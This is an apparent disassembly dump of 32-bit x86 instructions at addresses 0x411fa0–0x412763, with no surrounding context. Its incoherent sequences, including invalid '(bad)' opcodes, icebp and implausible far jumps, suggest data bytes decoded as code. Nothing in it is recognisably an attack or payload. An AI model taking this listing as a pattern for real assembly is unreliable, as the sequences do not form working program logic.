  411fa0:	add    DWORD PTR [eax],eax
  411fa2:	add    al,0x2
  411fa4:	xchg   ebp,eax
  411fa5:	hlt    
  411fa6:	call   DWORD PTR ds:0x429260
  411fac:	add    BYTE PTR ds:0x12f07c82,0x11
  411fb3:	push   eax
  411fb4:	xor    BYTE PTR [edi],0x30
  411fb7:	and    DWORD PTR [eax],eax
  411fb9:	pusha  
  411fba:	add    al,0x8
  411fbc:	nop
  411fbd:	inc    eax
  411fbe:	xchg   edx,eax
  411fbf:	and    al,0x14
  411fc1:	xchg   esp,eax
  411fc2:	mov    WORD PTR [eax],es
  411fc4:	mov    ecx,0x2200024
  411fc9:	add    DWORD PTR [eax],0x20a0082
  411fcf:	push   eax
  411fd0:	add    al,0x0
  411fd2:	and    BYTE PTR [ebx+0x44],ah
  411fd5:	add    DWORD PTR [eax],eax
  411fd7:	add    al,0x86
  411fd9:	inc    esp
  411fda:	or     BYTE PTR [eax+0x21],al
  411fdd:	or     DWORD PTR [eax],eax
  411fdf:	add    al,0x0
  411fe1:	add    DWORD PTR [eax],eax
  411fe3:	lods   eax,DWORD PTR ds:[esi]
  411fe4:	rol    BYTE PTR [edx],1
  411fe6:	enter  0x24d0,0x81
  411fea:	or     DWORD PTR ds:0x2a220281,eax
  411ff0:	add    BYTE PTR [eax-0x3fee0000],ah
  411ff6:	inc    eax
  411ff7:	mov    DWORD PTR [eax],edx
  411ff9:	or     DWORD PTR [eax+0x2a],edx
  411ffc:	dec    eax
  411ffd:	pusha  
  411ffe:	add    eax,0x50018c4f
  412003:	pop    esi
  412004:	ret    0x4100
  412007:	inc    eax
  412008:	or     BYTE PTR [eax],0x0
  41200b:	adc    BYTE PTR [eax+0x64540510],al
  412011:	and    DWORD PTR [eax+ecx*1],esp
  412014:	add    BYTE PTR [ecx+0x18010c9b],al
  41201a:	dec    ebx
  41201b:	dec    eax
  41201c:	sbb    BYTE PTR [eax+0x8],ah
  41201f:	daa    
  412020:	and    BYTE PTR [eax],cl
  412022:	bound  eax,QWORD PTR [ecx]
  412024:	add    BYTE PTR [ebp+0x1],cl
  412027:	pop    edx
  412028:	add    al,0xa8
  41202a:	add    BYTE PTR [ebx],al
  41202c:	adc    eax,DWORD PTR [eax]
  41202e:	and    BYTE PTR [edx],0x4
  412031:	mov    al,BYTE PTR [eax]
  412033:	and    al,0x82
  412035:	and    DWORD PTR [eax+0x4b],eax
  412038:	pushf  
  412039:	add    al,0x52
  41203b:	and    DWORD PTR [eax],esp
  41203d:	mov    DWORD PTR [ecx+eiz*1],edx
  412040:	inc    eax
  412041:	dec    edx
  412042:	and    ah,BYTE PTR [eax]
  412044:	mov    al,0x10
  412046:	and    al,BYTE PTR [eax+0x1]
  412049:	adc    DWORD PTR [eax+esi*2],0x20b0c900
  412050:	fsubr  DWORD PTR [eax]
  412052:	pop    eax
  412053:	or     al,0x19
  412055:	and    DWORD PTR [eax],ecx
  412057:	sub    BYTE PTR [edx+ebp*1+0x1086a060],dl
  41205e:	rol    BYTE PTR [ebx+0x24040030],0x0
  412065:	push   es
  412066:	or     eax,0x4a400100
  41206b:	sbb    BYTE PTR [eax],dl
  41206d:	and    BYTE PTR [eax],al
  41206f:	adc    BYTE PTR [esi],cl
  412071:	or     BYTE PTR [eax],al
  412073:	inc    eax
  412074:	sbb    al,0x68
  412076:	adc    BYTE PTR [edx],ah
  412078:	add    al,0x29
  41207a:	imul   eax,DWORD PTR [eax],0x5a014018
  412080:	add    esp,esi
  412082:	add    ecx,esi
  412084:	xor    ah,BYTE PTR [eax]
  412086:	and    al,0x81
  412088:	pusha  
  412089:	add    BYTE PTR [ecx-0x78],dh
  41208c:	add    BYTE PTR [eax],dl
  41208e:	pusha  
  41208f:	dec    eax
  412090:	push   eax
  412091:	and    BYTE PTR [eax],ah
  412093:	jmp    0x908520de
  412098:	mov    eax,ds:0x81905304
  41209d:	add    BYTE PTR [eax+0x3009040],ah
  4120a3:	add    DWORD PTR [eax-0x70],esp
  4120a6:	xor    BYTE PTR [eax-0x68b6e780],dh
  4120ac:	add    BYTE PTR [eax+0x0],al
  4120af:	adc    BYTE PTR [ecx],0x28
  4120b2:	or     BYTE PTR [edx],dl
  4120b4:	add    al,BYTE PTR [edx]
  4120b6:	add    BYTE PTR [ecx],al
  4120b8:	ret    0x92
  4120bb:	add    BYTE PTR [eax],0x0
  4120be:	xor    DWORD PTR [eax-0x7c],edx
  4120c1:	or     ah,0x2
  4120c4:	or     BYTE PTR [eax],cl
  4120c6:	nop
  4120c7:	or     BYTE PTR [eax+0x433a2801],ah
  4120cd:	push   cs
  4120ce:	(bad)  
  4120cf:	push   ecx
  4120d0:	add    BYTE PTR [eax],ah
  4120d2:	and    DWORD PTR [eax+eax*1],eax
  4120d5:	push   eax
  4120d6:	add    BYTE PTR [eax],dh
  4120d8:	add    BYTE PTR [eax],dl
  4120da:	adc    BYTE PTR [eax-0x5c9e7b00],al
  4120e0:	push   0x0
  4120e2:	rol    BYTE PTR [ecx],0x81
  4120e5:	sub    al,0x84
  4120e7:	push   ss
  4120e8:	mov    DWORD PTR [edx],eax
  4120ea:	adc    esp,DWORD PTR ds:0x10406d02
  4120f0:	and    esp,DWORD PTR [ecx]
  4120f2:	xchg   DWORD PTR [eax],ecx
  4120f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120f5:	pusha  
  4120f6:	push   es
  4120f7:	sbb    al,0x8a
  4120f9:	inc    ecx
  4120fa:	sub    BYTE PTR [ebx],al
  4120fc:	or     al,0x50
  4120fe:	add    al,0x41
  412100:	mov    BYTE PTR [ecx+0x800038e],cl
  412106:	push   ss
  412107:	inc    edx
  412108:	or     BYTE PTR [ebx],dl
  41210a:	inc    ebx
  41210b:	dec    eax
  41210c:	add    al,BYTE PTR [eax]
  41210e:	adc    DWORD PTR [edx],ebp
  412110:	and    BYTE PTR [eax+0x15],0xd4
  412114:	adc    DWORD PTR [edx+eax*1],esp
  412117:	cmp    DWORD PTR [edx],esp
  412119:	add    BYTE PTR [ecx],0x7
  41211c:	ret    
  41211d:	add    al,0x14
  41211f:	add    al,0x1
  412121:	or     eax,0x30800624
  412126:	add    DWORD PTR [eax],eax
  412128:	xchg   esp,eax
  412129:	inc    edx
  41212a:	xchg   ebp,eax
  41212b:	les    eax,FWORD PTR [edx]
  41212d:	and    DWORD PTR [eax],0x0
  412130:	and    al,0x4
  412132:	inc    ecx
  412133:	and    BYTE PTR [ebx],al
  412135:	xchg   BYTE PTR [edx],al
  412137:	or     BYTE PTR [eax],ah
  412139:	dec    eax
  41213a:	loop   0x41213e
  41213c:	add    BYTE PTR [esi+0x4202001],cl
  412142:	ror    esp,0x0
  412145:	mov    DWORD PTR [eax+0x52],ecx
  412148:	add    BYTE PTR [edx+0x0],dh
  41214b:	and    dl,BYTE PTR [ecx+0x38000121]
  412151:	nop
  412152:	add    BYTE PTR [eax],0x11
  412155:	sahf   
  412156:	adc    BYTE PTR [esi+0x18190804],bl
  41215c:	and    BYTE PTR [ecx],al
  41215e:	inc    ecx
  41215f:	add    al,BYTE PTR ds:0x8008001
  412165:	push   eax
  412166:	and    al,0x88
  412168:	or     BYTE PTR [eax+0x4],al
  41216b:	inc    ebp
  41216c:	or     BYTE PTR [ecx],ah
  41216e:	dec    eax
  41216f:	push   cs
  412170:	and    BYTE PTR [ebx],al
  412172:	nop
  412173:	sub    ah,BYTE PTR [eax+0x42142008]
  412179:	xchg   ebx,eax
  41217a:	mov    DWORD PTR [esi+0x50],edx
  41217d:	or     dl,BYTE PTR [edx]
  41217f:	or     BYTE PTR [eax],dh
  412181:	or     BYTE PTR [eax],0x94
  412184:	mov    al,ds:0x7400042c
  412189:	or     esp,DWORD PTR [esp+eax*1+0x20]
  41218d:	mov    ch,0xd8
  41218f:	xor    DWORD PTR [eax],0x590060e9
  412195:	test   al,0x2
  412197:	and    DWORD PTR [esi],0x12888900
  41219d:	push   ebx
  41219e:	sub    dh,BYTE PTR [eax]
  4121a0:	test   al,al
  4121a2:	test   al,ah
  4121a4:	add    BYTE PTR [ecx],al
  4121a6:	add    DWORD PTR [edx],0x6060a001
  4121ac:	and    eax,0x4008711
  4121b1:	xor    BYTE PTR [edi],cl
  4121b3:	adc    BYTE PTR [eax],al
  4121b5:	add    al,0x88
  4121b7:	or     eax,DWORD PTR [eax]
  4121b9:	xchg   esp,eax
  4121ba:	adc    BYTE PTR [edx*1-0x37fde3d8],bh
  4121c1:	call   0x48c2:0x32238885
  4121c8:	and    BYTE PTR [eax+0x9],al
  4121cb:	or     ah,BYTE PTR [ebx+0x0]
  4121ce:	push   eax
  4121cf:	add    dl,BYTE PTR [eax+0x40]
  4121d2:	inc    eax
  4121d3:	adc    BYTE PTR [eax],dl
  4121d5:	and    DWORD PTR [edi+0x20849100],eax
  4121db:	add    al,0x2
  4121dd:	sbb    eax,ebx
  4121df:	adc    BYTE PTR [ecx+0x64],al
  4121e2:	xor    BYTE PTR [ebx],dl
  4121e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121e5:	or     ah,BYTE PTR [eax]
  4121e7:	sbb    BYTE PTR [ecx-0x6dbaffa8],cl
  4121ed:	push   ecx
  4121ee:	sbb    DWORD PTR [ecx],eax
  4121f0:	or     BYTE PTR [ecx+0x42],0x4
  4121f4:	add    BYTE PTR [eax],dh
  4121f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121f7:	push   0x80025ba1
  4121fc:	test   BYTE PTR [eax],al
  4121fe:	mov    al,ds:0x62701000
  412203:	imul   eax,ebp,0x1108c804
  412209:	dec    eax
  41220a:	dec    eax
  41220b:	add    al,BYTE PTR [eax+0x0]
  41220e:	and    ecx,esi
  412210:	and    al,0x24
  412212:	adc    al,0x0
  412214:	add    al,0x0
  412216:	retf   0x562
  412219:	add    DWORD PTR [eax-0x3f],0xa442a8a7
  412220:	or     BYTE PTR [eax+0x4],bl
  412223:	or     ah,BYTE PTR [ecx]
  412225:	sub    DWORD PTR [edx],esp
  412227:	ror    BYTE PTR [eax],0x3
  41222a:	xchg   BYTE PTR [eax+ecx*1+0x0],cl
  41222e:	and    al,BYTE PTR [eax]
  412230:	inc    esp
  412231:	rol    BYTE PTR [eax-0x72f1f3f0],0x0
  412238:	and    eax,0x5041510
  41223d:	inc    eax
  41223e:	add    al,0xb
  412240:	dec    ecx
  412241:	enter  0x210,0x6c
  412245:	add    cl,BYTE PTR [eax]
  412247:	sbb    eax,DWORD PTR [eax]
  412249:	add    al,0x0
  41224b:	int3   
  41224c:	or     BYTE PTR [edx-0x7b6f7fe6],dh
  412252:	das    
  412253:	push   eax
  412254:	int3   
  412255:	pusha  
  412256:	add    BYTE PTR [ecx+edx*2+0x503042],al
  41225d:	mov    eax,0xe3102a
  412262:	add    ah,BYTE PTR [eax-0x7dffffb8]
  412268:	add    BYTE PTR [eax+ebp*4-0x6e],al
  41226c:	add    BYTE PTR [eax],0x54
  41226f:	add    BYTE PTR [eax+0x16],dh
  412272:	inc    eax
  412273:	inc    edx
  412274:	or     BYTE PTR [ebx+0x30a84cc],bl
  41227a:	pusha  
  41227b:	sub    BYTE PTR [eax],al
  41227d:	pop    edx
  41227e:	push   eax
  41227f:	stos   BYTE PTR es:[edi],al
  412280:	mov    al,ds:0xb3cb804
  412285:	sbb    BYTE PTR [eax],cl
  412287:	adc    BYTE PTR [ecx+0x20],dl
  41228a:	shr    DWORD PTR [eax],cl
  41228c:	pop    eax
  41228d:	inc    edx
  41228e:	dec    eax
  41228f:	add    DWORD PTR [edx+0x599cd800],edi
  412295:	sbb    BYTE PTR [eax+0x8108a52],0x9d
  41229c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41229d:	add    al,0x20
  41229f:	and    al,0x20
  4122a1:	pusha  
  4122a2:	ret    
  4122a3:	add    BYTE PTR [eax],bl
  4122a5:	sub    BYTE PTR [eax+0x100028],0x7
  4122ac:	rol    BYTE PTR [eax+0x2c],0x82
  4122b0:	add    DWORD PTR [eax+0xc90910],eax
  4122b6:	lods   eax,DWORD PTR ds:[esi]
  4122b7:	pop    es
  4122b8:	or     BYTE PTR [eax],cl
  4122ba:	pushf  
  4122bb:	cwde   
  4122bc:	adc    ebp,DWORD PTR [eax+0x62]
  4122bf:	and    BYTE PTR [edx+0x4],ah
  4122c2:	inc    eax
  4122c3:	inc    eax
  4122c4:	add    eax,DWORD PTR [eax+0x14]
  4122c7:	and    BYTE PTR [edx],al
  4122c9:	add    BYTE PTR [esp+eiz*4],dh
  4122cc:	mov    cs,WORD PTR [eax+0x31520400]
  4122d2:	pop    es
  4122d3:	xchg   ecx,eax
  4122d4:	adc    al,0xa0
  4122d6:	adc    BYTE PTR [eax+eax*1+0x50410088],cl
  4122dd:	push   es
  4122de:	push   cs
  4122df:	add    dl,bl
  4122e1:	push   eax
  4122e2:	xor    BYTE PTR [eax],ah
  4122e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122e5:	push   0xffffffd0
  4122e7:	rcl    DWORD PTR [esp+eax*4+0x4528e100],0x88
  4122ef:	or     BYTE PTR [edx],dl
  4122f1:	add    BYTE PTR [ecx],ah
  4122f3:	pop    eax
  4122f4:	sub    dh,BYTE PTR [eax]
  4122f6:	and    BYTE PTR [ebp+0x44],0x1
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	add    BYTE PTR [edx+0x9],cl
  4122ff:	adc    BYTE PTR [eax],dh
  412301:	and    BYTE PTR [esp+eax*1],cl
  412304:	and    edx,DWORD PTR [ecx+0x21]
  412307:	xor    BYTE PTR [esi],ah
  412309:	add    ah,dl
  41230b:	sbb    al,0x48
  41230d:	mov    ecx,DWORD PTR [eax+0x21]
  412310:	and    cl,BYTE PTR [edx]
  412312:	push   0x25c1900
  412317:	add    BYTE PTR [eax+ecx*1],cl
  41231a:	add    BYTE PTR [eax+0x42e682b],0x1
  412321:	or     BYTE PTR [eax+0x50],al
  412324:	adc    eax,0x21202c0
  412329:	add    eax,DWORD PTR [ebp+0x55468b43]
  41232f:	add    BYTE PTR [eax+0x5],ch
  412332:	and    BYTE PTR [ebx],ch
  412334:	mov    al,ds:0x101a054
  412339:	xchg   ecx,eax
  41233a:	add    edx,DWORD PTR [ecx]
  41233c:	push   edx
  41233d:	dec    esp
  41233e:	or     BYTE PTR [eax],al
  412340:	add    eax,0x93401220
  412345:	nop
  412346:	lds    edx,FWORD PTR [ecx]
  412348:	inc    eax
  412349:	and    al,BYTE PTR [eax+0x487001c4]
  41234f:	or     BYTE PTR [esi],al
  412351:	adc    eax,0x318890c
  412356:	push   edi
  412357:	mov    dl,0x0
  412359:	and    DWORD PTR [edx-0x48],edx
  41235c:	inc    ecx
  41235d:	or     al,BYTE PTR [eax+eax*2]
  412360:	add    BYTE PTR ds:0x2335822f,al
  412366:	add    eax,DWORD PTR [ecx]
  412368:	and    BYTE PTR [eax],ch
  41236a:	push   eax
  41236b:	xchg   ecx,eax
  41236c:	popf   
  41236d:	add    BYTE PTR [eax+0x28],al
  412370:	add    BYTE PTR [eax-0x5b6ecf70],ah
  412376:	adc    BYTE PTR [eax+0x23],dl
  412379:	add    BYTE PTR [eax+ecx*1-0x77ebfbdb],cl
  412380:	sbb    cl,BYTE PTR [ecx]
  412382:	mov    eax,0x600220c
  412387:	mov    bl,0x41
  412389:	outs   dx,BYTE PTR ds:[esi]
  41238a:	add    al,BYTE PTR [ebp+ebp*1+0x1212e002]
  412391:	pop    es
  412392:	nop
  412393:	xor    BYTE PTR [eax],dl
  412395:	adc    ch,BYTE PTR [eax+eax*4+0x52365c8]
  41239c:	add    ebx,DWORD PTR [eax+ecx*2+0x200903d4]
  4123a3:	cmp    DWORD PTR [eax+0x14a10001],eax
  4123a9:	or     BYTE PTR [esi],al
  4123ab:	rol    BYTE PTR ds:0x38d04c2d,0x26
  4123b2:	add    BYTE PTR [eax],ah
  4123b4:	push   ss
  4123b5:	add    BYTE PTR [ecx+0x1],ah
  4123b8:	stos   BYTE PTR es:[edi],al
  4123b9:	inc    eax
  4123ba:	add    BYTE PTR [eax-0x6e],cl
  4123bd:	rol    BYTE PTR [eax],0x22
  4123c0:	data16 mov al,ds:0xc44129
  4123c6:	fldenv [eax]
  4123c8:	rol    BYTE PTR [ebx],1
  4123ca:	add    DWORD PTR [eax+ecx*1],0x8890591
  4123d1:	or     al,al
  4123d3:	test   eax,0x8b507144
  4123d8:	add    al,al
  4123da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123db:	adc    DWORD PTR [eax],esp
  4123dd:	adc    BYTE PTR [edx+0x200b8180],al
  4123e3:	or     DWORD PTR [eax],eax
  4123e5:	je     0x4123ea
  4123e7:	imul   ecx,DWORD PTR [eax],0x66000e00
  4123ed:	or     DWORD PTR [ebx-0x7edef676],eax
  4123f3:	into   
  4123f4:	cmp    BYTE PTR [eax],cl
  4123f6:	test   DWORD PTR [ecx],esp
  4123f8:	push   es
  4123f9:	add    BYTE PTR [eax],ah
  4123fb:	adc    BYTE PTR [eax],al
  4123fd:	adc    DWORD PTR [eax],ecx
  4123ff:	nop
  412400:	add    BYTE PTR [eax-0x74eff800],al
  412406:	adc    al,0xc1
  412408:	bound  edx,QWORD PTR [edx]
  41240a:	and    BYTE PTR [eax+0xc020a8c],0x81
  412411:	add    al,dl
  412413:	rol    BYTE PTR [edx+0x200804],1
  412419:	or     DWORD PTR [ebx],0xc09c4600
  41241f:	jl     0x412449
  412421:	mov    ah,BYTE PTR [ecx]
  412423:	ret    0x948
  412426:	dec    eax
  412427:	lods   eax,DWORD PTR ds:[esi]
  412428:	nop
  412429:	pusha  
  41242a:	or     eax,0x186040
  41242f:	add    BYTE PTR [ecx],al
  412431:	add    eax,0x804240c8
  412436:	test   al,0x20
  412438:	add    BYTE PTR [eax],al
  41243a:	inc    ecx
  41243b:	pusha  
  41243c:	add    BYTE PTR [edx],cl
  41243e:	adc    BYTE PTR [eax],bl
  412440:	and    BYTE PTR [eax+eiz*4+0x0],cl
  412444:	add    al,0x24
  412446:	rol    BYTE PTR [eax-0x7efdff00],1
  41244c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41244d:	dec    edx
  41244e:	pop    es
  41244f:	enter  0x5a81,0x0
  412453:	sbb    BYTE PTR [eax-0x7fb3ffdf],cl
  412459:	add    BYTE PTR [eax+edx*1],al
  41245c:	add    cl,BYTE PTR [eax-0x33]
  41245f:	add    DWORD PTR [eax],eax
  412461:	and    BYTE PTR [edx],dh
  412463:	in     al,dx
  412464:	adc    al,BYTE PTR [eax+esi*1+0x0]
  412468:	and    edx,DWORD PTR es:[eax-0x40]
  41246c:	add    BYTE PTR [eax],al
  41246e:	dec    eax
  41246f:	mov    al,ds:0x4d4a01
  412474:	add    BYTE PTR [eax+edx*4],al
  412477:	add    BYTE PTR [eax+0x41000885],bh
  41247d:	or     BYTE PTR [eax],dh
  41247f:	mov    BYTE PTR [edi+0x490390],ah
  412485:	add    eax,0x50032020
  41248a:	inc    ecx
  41248b:	or     al,BYTE PTR [eax+0x5]
  41248e:	inc    eax
  41248f:	add    BYTE PTR [eax],cl
  412491:	mov    al,BYTE PTR [ecx]
  412493:	pusha  
  412494:	sbb    DWORD PTR [eax],eax
  412496:	and    al,0x13
  412498:	or     eax,0x21001009
  41249d:	push   es
  41249e:	add    BYTE PTR [eax],ah
  4124a0:	and    DWORD PTR [ecx],ebx
  4124a2:	and    BYTE PTR [edx],cl
  4124a4:	xor    BYTE PTR fs:[ecx],0x48
  4124a8:	or     BYTE PTR [eax+0x1],al
  4124ab:	and    BYTE PTR [edx],ah
  4124ad:	sub    BYTE PTR [eax],0x10
  4124b0:	pop    es
  4124b1:	pusha  
  4124b2:	inc    eax
  4124b3:	jmp    0x504a:0x6040003
  4124ba:	and    BYTE PTR ds:0x48020803,dl
  4124c0:	add    BYTE PTR [esi+0x24],al
  4124c3:	add    eax,0xa9190032
  4124c8:	rcl    BYTE PTR [eax],0x28
  4124cb:	adc    BYTE PTR [eax-0x50],dh
  4124ce:	add    BYTE PTR [eax+eiz*4],dh
  4124d1:	or     eax,DWORD PTR [eax]
  4124d3:	add    ah,BYTE PTR [eax]
  4124d5:	add    eax,DWORD PTR [ecx-0x7ffdeecc]
  4124db:	sub    BYTE PTR [ecx+0x43],dh
  4124de:	mov    al,ds:0x40c090b4
  4124e3:	or     DWORD PTR ds:0xc80dac0c,edx
  4124e9:	adc    al,0x44
  4124eb:	add    al,cl
  4124ed:	add    dh,BYTE PTR [edx+edx*2]
  4124f0:	mov    al,ds:0x950f2058
  4124f5:	add    DWORD PTR [edx-0x80],esp
  4124f8:	add    al,0xc1
  4124fa:	cmp    BYTE PTR [ebx],al
  4124fc:	sbb    BYTE PTR [ecx],dl
  4124fe:	and    BYTE PTR [eax],0x45
  412501:	pusha  
  412502:	inc    eax
  412503:	add    BYTE PTR [ebx],0x8
  412506:	mov    BYTE PTR [eax+0x16],al
  412509:	fs or  dl,0x30
  41250d:	push   esp
  41250e:	and    al,0x30
  412510:	pop    es
  412511:	add    BYTE PTR ss:[eax],al
  412514:	add    BYTE PTR [eax],0x11
  412517:	sub    DWORD PTR [eax+ebx*2+0x21],eax
  41251b:	sbb    BYTE PTR ds:0x20800680,cl
  412521:	push   edx
  412522:	add    al,0x4
  412524:	xor    BYTE PTR [ebx],cl
  412526:	pop    eax
  412527:	adc    cl,BYTE PTR [edx+0x34b88609]
  41252d:	push   ss
  41252e:	icebp  
  41252f:	add    BYTE PTR [edx],0x98
  412532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412533:	and    eax,DWORD PTR [edx]
  412535:	or     BYTE PTR [ecx],cl
  412537:	mov    eax,DWORD PTR [eax+0x38a0cc20]
  41253d:	add    DWORD PTR [ebx+0x10328234],0x4c88080
  412547:	or     BYTE PTR [esi+0x1],bl
  41254a:	inc    edx
  41254b:	mov    DWORD PTR [eax],eax
  41254d:	jl     0x412552
  41254f:	sbb    BYTE PTR ds:0x40003,al
  412555:	and    dl,0x16
  412558:	and    BYTE PTR [eax-0x3c],al
  41255b:	add    DWORD PTR [eax],0x41000032
  412561:	adc    BYTE PTR [eax],ch
  412563:	retf   0x5048
  412566:	and    al,0x8
  412568:	mov    BYTE PTR [eax+0x8001d0a],ch
  41256e:	add    BYTE PTR [ebx],al
  412570:	sub    al,0x5
  412572:	test   BYTE PTR [ecx],dl
  412574:	and    BYTE PTR [edx],bl
  412576:	or     al,0x41
  412578:	adc    BYTE PTR [eax],al
  41257a:	add    al,al
  41257c:	or     BYTE PTR [eax+0x4],al
  41257f:	add    DWORD PTR [eax+0x31c00060],esp
  412585:	adc    BYTE PTR [esi],dh
  412587:	add    al,0x40
  412589:	inc    eax
  41258a:	or     BYTE PTR [eax+eax*1],ah
  41258d:	pusha  
  41258e:	add    cl,al
  412590:	mov    BYTE PTR [eax],ch
  412592:	mov    al,ds:0x5990e8c4
  412597:	adc    BYTE PTR [ecx+0x41],dl
  41259a:	and    BYTE PTR [eax+0x14],cl
  41259d:	inc    ecx
  41259e:	xor    al,0x46
  4125a0:	or     DWORD PTR [eax],0x82a31049
  4125a6:	cmp    BYTE PTR [eax+edx*1],0x0
  4125aa:	sub    al,0x0
  4125ac:	dec    eax
  4125ad:	add    al,0x3
  4125af:	and    cl,bh
  4125b1:	test   eax,0x11280001
  4125b6:	les    ecx,FWORD PTR [edx]
  4125b8:	sub    eax,DWORD PTR [eax+0x228a7e08]
  4125be:	add    BYTE PTR [eax],dl
  4125c0:	inc    eax
  4125c1:	xor    al,0x4e
  4125c3:	fs sub esp,edx
  4125c6:	cmp    ch,BYTE PTR [eax+0x24]
  4125c9:	and    BYTE PTR [eax],al
  4125cb:	and    al,BYTE PTR [eax]
  4125cd:	add    DWORD PTR [eax+0x11101000],eax
  4125d3:	add    BYTE PTR [eax],al
  4125d5:	or     DWORD PTR [edx],0x2020981
  4125db:	pop    es
  4125dc:	xor    BYTE PTR [esi+0xd086508],al
  4125e2:	add    BYTE PTR [edx+0x84012],ch
  4125e8:	inc    eax
  4125e9:	adc    al,0x8d
  4125eb:	push   eax
  4125ec:	or     BYTE PTR [eax+eiz*1-0x6c4ff2fc],cl
  4125f3:	or     eax,0x40401049
  4125f8:	or     BYTE PTR [ecx],ah
  4125fa:	test   BYTE PTR [esp],al
  4125fd:	pusha  
  4125fe:	push   es
  4125ff:	add    BYTE PTR [eax+0x3b],ah
  412602:	adc    BYTE PTR [ebx],dl
  412604:	and    BYTE PTR [ebp+0x66],dl
  412607:	add    BYTE PTR [eax+eax*1+0x44],cl
  41260b:	xor    BYTE PTR [edx+0x20],al
  41260e:	ror    BYTE PTR [edx],1
  412610:	adc    al,0x84
  412612:	or     BYTE PTR [eax+0x2b],dl
  412615:	xor    DWORD PTR [eax],esp
  412617:	popa   
  412618:	adc    al,BYTE PTR [eax]
  41261a:	sbb    BYTE PTR es:[eax],al
  41261d:	imul   esp,DWORD PTR [eax+0x48100218],0x28101018
  412627:	add    eax,0x4220941
  41262c:	fmul   QWORD PTR [esi]
  41262e:	inc    eax
  41262f:	add    BYTE PTR [eax],ah
  412631:	mov    ah,0x50
  412633:	push   es
  412634:	adc    BYTE PTR [eax+0xc],al
  412637:	ror    DWORD PTR [edx],0x1
  41263a:	adc    al,0x0
  41263c:	inc    ebx
  41263d:	test   BYTE PTR [edx-0x7ebb7c00],ah
  412643:	adc    cl,BYTE PTR [edx+0x1]
  412646:	add    DWORD PTR [edi],eax
  412648:	add    al,0xaa
  41264a:	pushf  
  41264b:	add    BYTE PTR [ecx],al
  41264d:	arpl   WORD PTR [eax],si
  41264f:	or     al,0x30
  412651:	cwde   
  412652:	mov    dl,0x1
  412654:	mov    al,ds:0x6a6f6237
  412659:	loopne 0x412684
  41265b:	or     DWORD PTR [edx+0x4060552],ecx
  412661:	add    BYTE PTR [eax-0x80],al
  412664:	or     BYTE PTR es:[edx],ah
  412667:	add    DWORD PTR [ecx],ecx
  412669:	dec    ebx
  41266a:	nop
  41266b:	pop    ebp
  41266c:	sbb    BYTE PTR [eax],bl
  41266e:	and    BYTE PTR [ebx],cl
  412670:	inc    esp
  412671:	lods   al,BYTE PTR ds:[esi]
  412672:	call   0x21493ef8
  412677:	and    eax,0x1a298000
  41267c:	or     BYTE PTR [ebp+eax*8+0x4],dl
  412680:	mov    al,BYTE PTR [eax]
  412682:	pusha  
  412683:	add    al,BYTE PTR [esp+ecx*1]
  412686:	test   DWORD PTR [edx+0x22],ebx
  412689:	push   ecx
  41268a:	adc    BYTE PTR [eax],al
  41268c:	ret    
  41268d:	sbb    BYTE PTR [edx],0x80
  412690:	mov    al,ds:0x8b100492
  412695:	add    eax,DWORD PTR [eax]
  412697:	sub    BYTE PTR [esp+edx*1],ah
  41269a:	pusha  
  41269b:	sbb    BYTE PTR [ebp+0x40],0x20
  41269f:	add    DWORD PTR [ecx+0x1],esi
  4126a2:	mov    BYTE PTR [eax],dl
  4126a4:	and    eax,0x1488a025
  4126a9:	and    BYTE PTR [eax],al
  4126ab:	add    al,BYTE PTR [edx]
  4126ad:	sbb    eax,DWORD PTR [eax-0x2c77fec0]
  4126b3:	mov    al,ds:0x1438004
  4126b8:	add    BYTE PTR [ecx+0x31],bh
  4126bb:	nop
  4126bc:	adc    BYTE PTR [ecx],al
  4126be:	and    dl,cl
  4126c0:	and    DWORD PTR [esi],ecx
  4126c2:	add    DWORD PTR [ebx],eax
  4126c4:	and    BYTE PTR [edx],dh
  4126c6:	push   0x98220850
  4126cb:	or     al,0x43
  4126cd:	sub    DWORD PTR [eax+esi*1+0x41243020],edx
  4126d4:	cmp    BYTE PTR [ecx],0x70
  4126d7:	add    BYTE PTR [eax+eax*1],dl
  4126da:	add    BYTE PTR [edi+0x7],al
  4126dd:	add    DWORD PTR [eax+eiz*2+0x9],esp
  4126e1:	push   ss
  4126e2:	popf   
  4126e3:	and    eax,0x2028410a
  4126e8:	push   cs
  4126e9:	add    BYTE PTR [eax],0x23
  4126ec:	and    DWORD PTR [ecx-0x37],eax
  4126ef:	or     BYTE PTR [edx],al
  4126f1:	inc    eax
  4126f2:	rcl    DWORD PTR [ebx+0x7c85402e],0x1
  4126f9:	adc    al,0x0
  4126fb:	nop
  4126fc:	adc    BYTE PTR [ecx],dl
  4126fe:	and    dl,BYTE PTR [ecx+0x51]
  412701:	add    BYTE PTR [ecx],al
  412703:	add    al,BYTE PTR [eax]
  412705:	aaa    
  412706:	popa   
  412707:	fs aaa 
  412709:	xchg   ecx,eax
  41270a:	test   BYTE PTR [edx-0x67defbdc],al
  412710:	sub    al,0x0
  412712:	push   ss
  412713:	es cwde 
  412715:	cwde   
  412716:	adc    BYTE PTR [eax+0x49],ah
  412719:	adc    BYTE PTR [ecx],al
  41271b:	adc    ecx,esp
  41271d:	and    BYTE PTR [ebx],ah
  41271f:	and    BYTE PTR ds:0x45840040,al
  412725:	add    BYTE PTR [edi+edx*1+0x420bc8b],cl
  41272c:	add    dl,BYTE PTR [edx+0x1]
  41272f:	inc    eax
  412730:	add    BYTE PTR [eax+eax*1],al
  412733:	and    eax,0xc2469a2
  412738:	adc    al,0x2
  41273a:	add    BYTE PTR [ecx],al
  41273c:	add    al,BYTE PTR [ebx]
  41273e:	or     BYTE PTR [eax+ebp*1],al
  412741:	adc    BYTE PTR [eax+0x44],dl
  412744:	add    BYTE PTR [ecx+ecx*1-0x7ebe6fd0],ah
  41274b:	add    al,BYTE PTR [eax+0x10822410]
  412751:	or     eax,DWORD PTR [eax]
  412753:	inc    esp
  412754:	or     al,0x91
  412756:	or     BYTE PTR [eax],0x8d
  412759:	add    dl,BYTE PTR [ecx]
  41275b:	jb     0x4126e5
  41275d:	or     DWORD PTR [esi],0x40811a8
  412763:	clc    
